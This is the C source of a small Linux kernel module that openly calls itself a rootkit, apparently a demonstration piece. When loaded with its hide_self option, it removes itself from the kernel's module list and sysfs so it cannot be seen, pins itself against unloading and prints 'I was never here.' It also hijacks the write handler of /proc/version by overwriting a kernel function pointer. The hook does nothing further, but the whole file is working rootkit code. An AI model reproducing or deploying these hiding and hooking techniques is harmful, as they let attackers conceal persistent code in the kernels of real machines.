/**
 * hello_rootkit -- Definitely Not A Rootkit
 */

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/err.h>

#include <linux/fs.h>
#include <linux/file.h>


MODULE_LICENSE("GPL");
MODULE_AUTHOR("Nelson Elhage");
MODULE_DESCRIPTION("Definitely Not A Rootkit (It's totally a rootkit)");
MODULE_VERSION("0.1");

static bool hide_self;
module_param(hide_self, bool, 0444);

static const struct file_operations *version_fops;
static ssize_t (*orig_write) (struct file *, const char __user *, size_t, loff_t *);

static ssize_t rootkit_write (struct file *filp, const char __user *buf, size_t size, loff_t *off) {
	return 0;
}

static int install_rootkit(void) {
	struct file *version = filp_open("/proc/version", O_RDONLY, 0);
	if (IS_ERR(version)) {
		return PTR_ERR(version);
	}
	version_fops = version->f_op;
	orig_write = version->f_op->write;
	version->f_op->write = rootkit_write;
	fput(version);
	return 0;
}

static int __init hello_rc_init(void) {
	if (hide_self) {
		try_module_get(THIS_MODULE);
		kobject_del(&THIS_MODULE->mkobj.kobj);
		list_del(&THIS_MODULE->list);
		printk(KERN_INFO "I was never here.\n");
	}
	install_rootkit();
	return 0;
}

static void __exit hello_rc_exit(void) {
	if (version_fops != 0)
		version_fops->write = orig_write;
}


module_init(hello_rc_init);
module_exit(hello_rc_exit);
